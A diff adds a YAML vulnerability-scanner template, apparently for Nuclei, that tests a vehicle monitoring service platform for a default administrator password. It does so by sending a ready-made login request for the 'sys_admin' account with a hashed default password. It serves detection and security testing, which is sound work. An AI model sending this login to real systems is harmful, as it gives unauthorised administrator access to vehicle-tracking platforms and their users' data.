@@ -1,0 +1,36 @@
+id: vehicle-monitoring-default-password
+
+info:
+  name: Vehicle Monitoring Service Platform Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Vehicle monitoring service platform exists system administrator default password, allowing attackers to log in and perform arbitrary operations.
+  reference:
+    - http://www.31gps.net
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /gps-web/h5/login HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/json;charset=UTF-8
+        Content-Length: 481
+
+        {"loginType":"user","userId":"sys_admin","password":"e10adc3949ba59abbe56e057f20f883e","rsaId":null,"plateColor":"1","smsCode":null,"code":[{"x":1122,"y":462,"t":92474},{"x":1177,"y":454,"t":22},{"x":1219,"y":449,"t":19},{"x":1293,"y":445,"t":17},{"x":1350,"y":445,"t":22},{"x":1384,"y":447,"t":25}],"codeId":"668232fc6a0447d1b768365c2240e74d","loginLang":"zh_CN","loginWay":"ie","h5login":true}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ok"
+          - "\"status\":1"
